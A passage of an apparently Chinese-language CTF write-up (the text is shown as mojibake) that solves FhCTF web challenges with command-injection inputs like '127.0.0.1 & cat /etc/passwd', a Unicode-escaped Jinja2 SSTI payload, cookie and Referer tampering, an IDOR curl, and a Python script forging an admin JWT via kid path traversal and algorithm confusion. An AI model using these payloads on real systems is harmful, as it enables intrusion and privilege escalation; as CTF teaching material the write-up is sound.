<h3 id="The-Visual-Blind-Spot"><a href="#The-Visual-Blind-Spot" class="headerlink" title="The Visual Blind Spot"></a>The Visual Blind Spot</h3><p>è¨ˆç®—æ­£ç¢ºçš„ RGB å¯†é‘°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _base = <span class="built_in">parseInt</span>(<span class="string">&quot;32&quot;</span>, <span class="number">16</span>); <span class="comment">// &quot;32&quot; (åå…­é€²ä½) = 50 (åé€²ä½)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _kMap = &#123; </span><br><span class="line">    <span class="attr">x</span>: _base &lt;&lt; <span class="number">1</span>,  <span class="comment">// 50 &lt;&lt; 1 = 100</span></span><br><span class="line">    <span class="attr">y</span>: _base,       <span class="comment">// 50</span></span><br><span class="line">    <span class="attr">z</span>: _base &lt;&lt; <span class="number">2</span>   <span class="comment">// 50 &lt;&lt; 2 = 200</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ­£ç¢ºçš„ RGB å€¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R = 100</span><br><span class="line"></span><br><span class="line">G = 50</span><br><span class="line"></span><br><span class="line">B = 200</span><br></pre></td></tr></table></figure>
<p>è§£å¯† sys-config æ•¸æ“š<br>data-params åŒ…å«åŠ å¯†çš„æ•¸æ“šï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414</span><br></pre></td></tr></table></figure>
<p>è§£å¯†å…¬å¼ï¼šcharCode &#x3D; (n &#x2F; 3) - 13</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Stn3am_C1ph3p&#125;</span><br></pre></td></tr></table></figure>


<h3 id="SYSTEM-ROOT-SHELL"><a href="#SYSTEM-ROOT-SHELL" class="headerlink" title="SYSTEM ROOT SHELL"></a>SYSTEM ROOT SHELL</h3><p><img src="/img/FhCTF/14.webp" alt="image"></p>
<p>åœ¨ script æ¨™ç±¤ä¸­ç™¼ç¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript</span><br><span class="line">const _obs = [82, 67, 69, 95, 83, 117, 99, 99, 101, 115, 115, 95, 118, 51]; </span><br><span class="line">const _h = [70, 104, 67, 84, 70, 123]; </span><br><span class="line">const isInject = /[;&amp;|]/.test(cmd);</span><br></pre></td></tr></table></figure>

<p>ASCII ç¢¼æ•¸çµ„è½‰æ›ç‚ºå­—å…ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_h â†’ &quot;FhCTF&#123;&quot;</span><br><span class="line"></span><br><span class="line">_obs â†’ &quot;RCE__v3&quot;</span><br><span class="line"></span><br><span class="line">æœ€å¾ŒåŠ ä¸Š &quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>è§¸ç™¼æ–¹å¼</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> | whoami</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp; <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;RCE__v3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Welcome-to-Cybersecurity-Jungle"><a href="#Welcome-to-Cybersecurity-Jungle" class="headerlink" title="Welcome to Cybersecurity Jungle"></a>Welcome to Cybersecurity Jungle</h3><p><img src="/img/FhCTF/15.webp" alt="image"><br>ä¸€é€²ä¾†æœƒçœ‹åˆ°ä¸Šé¢çš„ç•«é¢ï¼Œçœ‹ HTML sourceæ™‚,æ³¨æ„åˆ° title æ¨™ç±¤åŒ…å«ä¸€æ®µæ—¥æ–‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¨€èªï¼ˆã’ã‚“ã”ï¼‰ã‚’å¤‰ï¼ˆã‹ï¼‰ãˆã¦ã‚‚ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã®æœ¬è³ªï¼ˆã»ã‚“ã—ã¤ï¼‰ã¯å¤‰ï¼ˆã‹ï¼‰ã‚ã‚‰ãªã„ã€‚</span><br></pre></td></tr></table></figure>
<p>æ„æ—¨ â€œå³ä½¿æ”¹è®Šèªè¨€ï¼Œç·¨ç¨‹çš„æœ¬è³ªä¹Ÿä¸æœƒæ”¹è®Š</p>
<p>é¡Œç›®çš„é—œéµåœ¨æ–¼è¨­ç½®æ­£ç¢ºçš„ Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie åç¨± (Base64 ç·¨ç¢¼): aXNGbGFnU2hvdzJ1</span><br></pre></td></tr></table></figure>
<p>è§£ç¢¼å¾Œ:  <code>isFlagShow2u</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie å€¼ (Base64 ç·¨ç¢¼): 44Go44GF44KL44O8</span><br></pre></td></tr></table></figure>
<p>è§£ç¢¼å¾Œ: <code>ã¨ã…ã‚‹ãƒ¼ (æ—¥æ–‡çš„ &quot;true&quot;)</code></p>
<p>æ¥ä¸‹ä¾†é€²åˆ° Application æ”¹ cookie å€¼å¾Œé‡æ–°æ•´ç†å³å¯</p>
<p><img src="/img/FhCTF/16.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Templating-Danger"><a href="#Templating-Danger" class="headerlink" title="Templating Danger"></a>Templating Danger</h3><p>SSTIé¡Œ</p>
<p>ç¹éæ–¹æ³•:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;\\u&quot;</span> <span class="keyword">in</span> val:</span><br><span class="line">    normalize_val = val.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    context[context_key] = Template(normalize_val).render()</span><br></pre></td></tr></table></figure>
<p>ç•¶è¼¸å…¥åŒ…å« \u æ™‚ï¼Œç³»çµ±æœƒåŸ·è¡Œ Unicode è§£ç¢¼ï¼Œç„¶å¾Œåœ¨éæ¿¾å¾Œç›´æ¥ç”¨ Jinja2 çš„ Template().render() æ¸²æŸ“å…§å®¹ã€‚é€™å…è¨±æˆ‘å€‘ä½¿ç”¨ Unicode ç·¨ç¢¼ç¹éæ‹¬è™Ÿéæ¿¾ã€‚</p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\u007b\u007bcycler.__init__.__globals__.os.environ[<span class="string">&#x27;FLAG&#x27;</span>]\u007d\u007d</span><br></pre></td></tr></table></figure>
<p><img src="/img/FhCTF/17.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;T3mpl371ng_n33d_t0_b3_m0r3_c4r3fullğŸ¥¹&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Documents"><a href="#Documents" class="headerlink" title="Documents"></a>Documents</h3><p>ä¸€é€²ä¾†çœ‹ç…§æ…£ä¾‹çœ‹sourcesï¼Œæ‰¾å‡ºéš±è—å­—å…ƒ<br><img src="/img/FhCTF/18.webp" alt="image"></p>
<ul>
<li>â€œHTTP Header å‘Šè¨´äº†ä½ ä¸€åˆ‡â€</li>
</ul>
<p>æª¢æŸ¥ HTTP æ¨™é ­ç™¼ç¾: powerby: FastAPI<br>FastAPI é€šå¸¸æœ‰ &#x2F;openapi.json ç«¯é»<br><img src="/img/FhCTF/19.webp" alt="image"><br>å¯ä»¥ç™¼ç¾ &#x2F;flag.html ç«¯é»éœ€è¦ Referer æ¨™é ­ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å½é€ ä»–</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://9f1604e5.fhctf.systems/flag.html&quot;</span> `</span><br><span class="line">    <span class="literal">-Headers</span> <span class="selector-tag">@</span>&#123;<span class="string">&quot;Referer&quot;</span>=<span class="string">&quot;https://localhost.app:8000/index.html&quot;</span>&#125; `</span><br><span class="line">    <span class="literal">-UseBasicParsing</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Content</span><br></pre></td></tr></table></figure>

<p><img src="/img/FhCTF/20.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;URL_encod3d_m337_p47h_d15cl0sureğŸ˜±ğŸ˜±&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LOG-ACCESS"><a href="#LOG-ACCESS" class="headerlink" title="LOG ACCESS"></a>LOG ACCESS</h3><p><img src="/img/FhCTF/21.webp" alt="image"></p>
<p>é€™é¡Œæä¾›äº†ä¸€å€‹ã€Œå®‰å…¨çš„æ—¥èªŒè®€å–å·¥å…·ã€ï¼Œè²ç¨±èƒ½åµæ¸¬ä¸¦é˜»æ“‹æ‰€æœ‰ Path Traversal æ”»æ“Š ã€‚é¡Œç›®æ˜ç¢ºæç¤ºï¼šé€™å€‹å·¥å…·å®Œå…¨æ²’æœ‰å¾Œç«¯ï¼Œæ‰€æœ‰åˆ¤æ–·ä¼¼ä¹éƒ½åœ¨ç€è¦½å™¨ä¸­å®Œæˆã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> check1 = input.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> &gt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> check2 = input.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;flag&#x27;</span>) !== -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (check1 &amp;&amp; check2) &#123;</span><br><span class="line">    <span class="keyword">const</span> final = _h + <span class="string">&quot;&#123;&quot;</span> + _c1 + _c3 + <span class="string">&quot;_&quot;</span> + _c2 + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    output.<span class="property">innerText</span> = <span class="string">&quot;ACCESS_GRANTED:\n&quot;</span> + final;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é©—è­‰æ¢ä»¶éå¸¸æ¸…æ¥šï¼š</p>
<ul>
<li>check1ï¼šè¼¸å…¥å¿…é ˆåŒ…å«è¶…é 3 å€‹é»ï¼ˆ. å­—å…ƒï¼‰</li>
<li>check2ï¼šè¼¸å…¥å¿…é ˆåŒ…å« â€œflagâ€ å­—ä¸²ï¼ˆä¸å€åˆ†å¤§å°å¯«ï¼‰</li>
</ul>
<p>æ··æ·†å­—ä¸²è§£ç¢¼<br>JavaScript ä¸­ä½¿ç”¨äº†å¹¾å€‹æ··æ·†çš„è®Šæ•¸ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _h = [<span class="number">70</span>, <span class="number">104</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>].<span class="title function_">map</span>(<span class="function"><span class="params">c</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// ASCII è§£ç¢¼ï¼šFhCTF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c1 = <span class="string">&quot;\x50\x61\x74\x68\x5f&quot;</span>;</span><br><span class="line"><span class="comment">// Hex è§£ç¢¼ï¼šPath_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c2 = (<span class="number">21337</span> &gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line"><span class="comment">// ä½å…ƒé‹ç®—ï¼š21337 &gt;&gt; 4 = 1333ï¼Œè½‰ hex = 535</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c3 = <span class="string">&quot;\x54\x72\x34\x76&quot;</span>;</span><br><span class="line"><span class="comment">// Hex è§£ç¢¼ï¼šTr4v</span></span><br></pre></td></tr></table></figure>
<p>çµ„åˆèµ·ä¾†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Path_Tr4v_535&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Pathway-leak"><a href="#Pathway-leak" class="headerlink" title="Pathway-leak"></a>Pathway-leak</h3><p>æ‰“é–‹é¡Œç›®ç¶²ç«™ï¼Œè§€å¯Ÿæª”æ¡ˆç®¡ç†ä»‹é¢èˆ‡ç¶²é åŸå§‹ç¢¼ã€‚<br><img src="/img/FhCTF/22.webp" alt="image"></p>
<p>åœ¨ <code>&lt;script&gt;</code> å€å¡Šä¸­ç™¼ç¾æª”æ¡ˆè¼‰å…¥æ˜¯å‘¼å«ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">TENANT</span> = <span class="string">&#x27;guest_user&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">`/api/assets/<span class="subst">$&#123;TENANT&#125;</span>/<span class="subst">$&#123;filename&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<p>é¡Œç›®å¦å¤–æä¾›çš„æª”æ¡ˆæ¸…å–®é¡¯ç¤ºä¼ºæœå™¨ä¸Šé‚„å­˜åœ¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_admin/flag.txt (38B)</span><br></pre></td></tr></table></figure>
<p>æ¨è«–å¾Œç«¯ API å¾ˆå¯èƒ½æ²’æœ‰æª¢æŸ¥ç›®å‰ä½¿ç”¨è€…æ˜¯å¦çœŸçš„å±¬æ–¼è©² tenantï¼Œå› æ­¤ç›´æ¥å˜—è©¦è·¨ tenant è«‹æ±‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt</span><br></pre></td></tr></table></figure>

<p>ä¼ºæœå™¨å›æ‡‰ HTTP 200ï¼Œå…§å®¹ç‚ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;p4th_tr4v3rs4l_w3_w4n7_t0_av01d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="KID"><a href="#KID" class="headerlink" title="KID"></a>KID</h3><p>é€²å…¥é¡Œç›®ç¶²é å¾Œï¼Œå…ˆæ‰“é–‹ç€è¦½å™¨çš„ã€Œæª¢æŸ¥å…ƒç´  &#x2F; é–‹ç™¼è€…å·¥å…·ã€ï¼Œåœ¨åŸå§‹ç¢¼èˆ‡ console&#x2F;log å€å¯ä»¥çœ‹åˆ°å¹¾æ®µ Debug è¨Šæ¯ï¼Œç›´æ¥æ´©æ¼äº†å¾Œç«¯çš„é©—è­‰é‚è¼¯ï¼š</p>
<ul>
<li><p>é‡‘é‘°è·¯å¾‘ Debugï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[DEBUG] Fetching key from: /app/keys/default.pem</span><br></pre></td></tr></table></figure>
<p>é€™ä»£è¡¨ä¼ºæœå™¨æœƒæ ¹æ“š JWT Header è£¡çš„ <code>kid</code>ï¼ˆKey IDï¼‰å»æª”æ¡ˆç³»çµ±è®€å–é‡‘é‘°ï¼Œä¾‹å¦‚ <code>kid = &quot;default.pem&quot;</code> å°æ‡‰ <code>/app/keys/default.pem</code>ã€‚</p>
</li>
<li><p>å±éšªçš„ç›¸å®¹æ¨¡å¼ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[DEBUG] HS256 Compatibility Mode: Enabled</span><br></pre></td></tr></table></figure>
<p>é€™è¡¨ç¤ºä¼ºæœç«¯åœ¨é©—è­‰ JWT æ™‚ï¼ŒåŒæ™‚æ”¯æ´éå°ç¨±ï¼ˆRS256ï¼‰èˆ‡å°ç¨±ï¼ˆHS256ï¼‰æ¨¡å¼ï¼Œè€Œä¸”å¯¦ä½œæ–¹å¼å­˜åœ¨æ¼”ç®—æ³•æ··æ·†é¢¨éšªã€‚</p>
</li>
<li><p>ç›®å‰æ¬Šé™ï¼šé é¢é¡¯ç¤ºç™»å…¥èº«ä»½ç‚º <code>guest</code>ï¼Œé¡¯ç„¶ç›®æ¨™æ˜¯å½é€  Token å–å¾— <code>admin</code> æ¬Šé™ã€‚</p>
</li>
</ul>
<p>æ¥è‘—å¾ Cookie ä¸­å–å‡º JWTï¼ˆä¾‹å¦‚ <code>access_token</code>ï¼‰ï¼Œä¸Ÿåˆ° jwt.io è§€å¯Ÿå…§å®¹ï¼Œå¯ä»¥å¾—åˆ°é¡ä¼¼çµæ§‹ï¼š</p>
<ul>
<li>Headerï¼š<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default.pem&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li>Payloadï¼š<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1704350000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>é€™äº›è³‡è¨Šå·²ç¶“è¶³å¤ åˆ¤æ–·ï¼šä¼ºæœå™¨æœƒä¾ <code>kid</code> å»è®€æª”æ¡ˆï¼Œä¸¦ç”¨å…¶ä¸­å…§å®¹ç•¶ä½œé‡‘é‘°ä¾†é©—è­‰ JWTã€‚</p>
<ul>
<li>æ¼æ´åŸç†åˆ†æ</li>
</ul>
<p>é€™é¡Œçµåˆäº†å…©å€‹å¸¸è¦‹éŒ¯èª¤ï¼š<strong>Directory Traversal</strong> + <strong>JWT Algorithm Confusion</strong>ã€‚</p>
<ul>
<li><p>Directory Traversal (ç›®éŒ„éæ­·)</p>
<p>  å¾Œç«¯å¯¦ä½œæ¦‚å¿µå¤§è‡´é¡ä¼¼ï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">key_path = <span class="string">&quot;/app/keys/&quot;</span> + kid</span><br><span class="line">key_data = <span class="built_in">open</span>(key_path, <span class="string">&quot;rb&quot;</span>).read()</span><br></pre></td></tr></table></figure>

<p>  è‹¥ <code>kid</code> æ²’æœ‰éæ¿¾ <code>../</code>ï¼Œæ”»æ“Šè€…å¯ä»¥å‚³å…¥åƒæ˜¯ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">../../../../../../dev/null</span><br></pre></td></tr></table></figure>

<p>  è®“ä¼ºæœå™¨å¯¦éš›å»é–‹å•Ÿçš„è·¯å¾‘è®Šæˆ <code>/dev/null</code>ï¼Œè€Œä¸æ˜¯é æœŸçš„ <code>/app/keys/default.pem</code>ã€‚<br>  é›–ç„¶æˆ‘å€‘çœ‹ä¸åˆ°æª”æ¡ˆå…§å®¹ï¼Œä½†ä¼ºæœå™¨æœƒã€Œè‡ªå·±ã€å¹«æˆ‘å€‘è¼‰å…¥ï¼Œä¸¦ç•¶æˆé‡‘é‘°ä½¿ç”¨ï¼Œé€™å°±æ˜¯åˆ©ç”¨é»ã€‚</p>
</li>
<li><p>JWT Algorithm Confusion (æ¼”ç®—æ³•æ··æ·†)</p>
<p>  é æœŸè¨­è¨ˆæ‡‰è©²æ˜¯ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>RS256</code>ï¼š  <ul>
<li>ä½¿ç”¨éå°ç¨±é‡‘é‘°ï¼ˆprivate key ç°½ç™¼ã€public key é©—è­‰ï¼‰ã€‚</li>
<li><code>.pem</code> æ‡‰è©²è¢«è¦–ç‚ºã€Œå…¬é‘°ã€ï¼Œåªèƒ½ç”¨ä¾†é©—è­‰ Signatureã€‚</li>
</ul>
</li>
</ul>
<p>  ä½†ç¾åœ¨ä¼ºæœå™¨æ”¯æ´ <code>HS256 Compatibility Mode</code>ï¼Œå¯¦ä½œé¡ä¼¼ï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;RS256&quot;</span>:</span><br><span class="line">    <span class="comment"># ç”¨ public key (pem) é©—è­‰</span></span><br><span class="line"><span class="keyword">elif</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;HS256&quot;</span>:</span><br><span class="line">    <span class="comment"># ä»ç„¶è®€åŒä¸€å€‹ pem æª”æ¡ˆï¼Œä½†æŠŠæ•´å€‹å…§å®¹ç•¶æˆ HMAC secret</span></span><br></pre></td></tr></table></figure>

<p>  çµæœè®Šæˆï¼š</p>
<ul>
<li>ç•¶ <code>alg = HS256</code> æ™‚ï¼Œä¼ºæœå™¨æœƒæŠŠã€ŒåŸæœ¬æ˜¯å…¬é‘°çš„ pem æª”å…§å®¹ã€ç•¶æˆå°ç¨±é‡‘é‘°ï¼ˆsecretï¼‰ä¾†é©—è­‰ HMACã€‚</li>
<li>åªè¦æ”»æ“Šè€…ã€ŒçŸ¥é“ã€é€™å€‹ secretï¼Œå°±èƒ½åœ¨å¤–é¢è‡ªå·±ç°½ Tokenã€‚</li>
</ul>
<p>  å•é¡Œæ˜¯ï¼š<code>default.pem</code> çš„å…§å®¹æˆ‘å€‘ä¸çŸ¥é“ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥åˆ©ç”¨ï¼›ä½†ç›®éŒ„éæ­·è®“æˆ‘å€‘å¯ä»¥é¸æ“‡ã€Œå…¶ä»–æª”æ¡ˆã€ä¾†ç•¶ secretã€‚</p>
</li>
<li><p>æ”»æ“Šæ€è·¯è¨­è¨ˆ</p>
<p>  é—œéµæƒ³æ³•ï¼š</p>
<ol>
<li>æ‰¾ä¸€å€‹ã€Œå…§å®¹å·²çŸ¥ã€çš„ç³»çµ±æª”æ¡ˆï¼Œè®“ä¼ºæœå™¨æŠŠå®ƒè®€é€²ä¾†ç•¶ HMAC secretã€‚</li>
<li>å° Linux ä¾†èªªï¼Œ<code>/dev/null</code> çš„å…§å®¹å°±æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å¯ä»¥é æœŸï¼š<ul>
<li>ç¨‹å¼è®€å– <code>/dev/null</code> â‡’ è®€åˆ°ç©ºå­—ä¸² <code>&quot;&quot;</code>ã€‚</li>
</ul>
</li>
<li>åªè¦æˆ‘å€‘åœ¨æœ¬åœ°ç«¯ç”¨ã€Œç©ºå­—ä¸²ã€ç•¶ secretï¼Œå°±èƒ½ç”¢å‡ºèˆ‡ä¼ºæœå™¨ä¸€è‡´çš„ HS256 ç°½ç« ã€‚</li>
<li>å†æŠŠ Payload è£¡çš„ <code>role</code> æ”¹æˆ <code>admin</code>ï¼Œå°±å¯ä»¥å½é€ ä¸€å€‹è¢«ä¼ºæœå™¨æ¥å—çš„ç®¡ç†å“¡ Tokenã€‚</li>
</ol>
<p>  å› æ­¤æ”»æ“Šæ­¥é©Ÿæ˜¯ï¼š</p>
<ul>
<li>æŠŠ JWT Header çš„ï¼š<ul>
<li><code>alg</code> æ”¹ç‚º <code>HS256</code></li>
<li><code>kid</code> æ”¹ç‚º <code>../../../../../../dev/null</code></li>
</ul>
</li>
<li>ç”¨ <code>key = &quot;&quot;</code> ï¼ˆç©ºå­—ä¸²ï¼‰ç°½ HMAC-SHA256ï¼Œç”¢ç”Ÿæ–°çš„ Tokenã€‚</li>
<li>å°‡ Payload ä¸­ <code>role</code> æ”¹æˆ <code>admin</code>ã€ç”šè‡³ <code>user</code> æ”¹æˆ <code>admin</code>ï¼Œé”æˆææ¬Šã€‚</li>
</ul>
</li>
<li><p>å¯¦ä½œ Exploitï¼ˆå½é€  JWTï¼‰</p>
<p>  ä»¥ä¸‹ä½¿ç”¨ Python + PyJWT ç”Ÿæˆå½é€  Tokenï¼š</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. æƒ¡æ„ Headerï¼šç›®éŒ„éæ­·æŒ‡å‘ /dev/nullï¼Œæ”¹ç”¨ HS256</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../../../../../dev/null&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æƒ¡æ„ Payloadï¼šç›´æ¥æŠŠè§’è‰²æ”¹æˆ admin</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1704355555</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ç°½åï¼šå¯†é‘°ç‚ºç©ºå­—ä¸²ï¼Œå°æ‡‰ä¼ºæœå™¨è®€å– /dev/null çš„çµæœ</span></span><br><span class="line">forged_token = jwt.encode(</span><br><span class="line">    payload,</span><br><span class="line">    key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    headers=headers</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å½é€ çš„ Token:\n&quot;</span>, forged_token)</span><br></pre></td></tr></table></figure>

<p>  æ­¥é©Ÿï¼š</p>
<ol>
<li>å¾åŸæœ¬ Cookie æ‹¿åˆ°åˆæ³• JWTï¼Œç¢ºèªæ¬„ä½åç¨±ï¼ˆä¾‹å¦‚ <code>role</code>ã€<code>user</code> ç­‰ï¼‰ã€‚</li>
<li>åŸ·è¡Œè…³æœ¬ï¼Œå¾—åˆ°ä¸€å€‹æ–°çš„ <code>forged_token</code> å­—ä¸²ã€‚</li>
<li>åœ¨ç€è¦½å™¨ä¸­ï¼š<ul>
<li>F12 â†’ Application â†’ Cookiesã€‚</li>
<li>æ‰¾åˆ°åŸæœ¬å­˜ JWT çš„ Cookieï¼ˆä¾‹å¦‚ <code>access_token</code>ï¼‰ã€‚</li>
<li>å°‡å…¶å€¼æ•´å€‹æ›¿æ›ç‚º <code>forged_token</code>ã€‚</li>
</ul>
</li>
<li>é‡æ–°æ•´ç†é é¢ã€‚</li>
</ol>
<p>  è‹¥å¾Œç«¯å¦‚é¡Œç›®æè¿°é‚£æ¨£å¯¦ä½œï¼Œä¼ºæœå™¨æœƒï¼š</p>
<ul>
<li>çœ‹åˆ° <code>alg = HS256</code> â†’ ç”¨ HMAC æ¨¡å¼é©—è­‰ã€‚</li>
<li>çœ‹åˆ° <code>kid = ../../../../../../dev/null</code> â†’ è®€å– <code>/dev/null</code> ç•¶ä½œ secretï¼ˆç©ºå­—ä¸²ï¼‰ã€‚</li>
<li>ç”¨ç©ºå­—ä¸²é©—è­‰ HMAC Signatureï¼Œå› ç‚ºæˆ‘å€‘æœ¬åœ°ç«¯ä¹Ÿæ˜¯ç”¨ç©ºå­—ä¸²ç°½çš„ï¼Œæ‰€ä»¥é©—è­‰æœƒé€šéã€‚</li>
<li>Payload è£¡ <code>role = admin</code>ï¼Œå› æ­¤èªå®šæˆ‘å€‘æ˜¯ç®¡ç†å“¡ã€‚</li>
</ul>
</li>
</ul>
<p><img src="/img/FhCTF/23.webp" alt="image"><br><img src="/img/FhCTF/24.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Something-You-Put-Into"><a href="#Something-You-Put-Into" class="headerlink" title="Something You Put Into"></a>Something You Put Into</h3><p>æª¢è¦– <code>main.py</code>ï¼Œå¯çŸ¥flagæ˜¯ç”±ç³»çµ±è¨­å®šå–å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FLAG = ChallSettings().flag</span><br></pre></td></tr></table></figure>
<p>ç¢ºèª <code>ChallSettings()</code> æœƒå¾ env variable ä¸­è®€å– Flagã€‚</p>
<p>æª¢æŸ¥ Docker YAML è¨­å®šæª”ï¼Œå¯ç™¼ç¾ Flag ä»¥ plain text å½¢å¼å­˜åœ¨ç’°å¢ƒè®Šæ•¸è¨­å®šä¸­ã€‚</p>
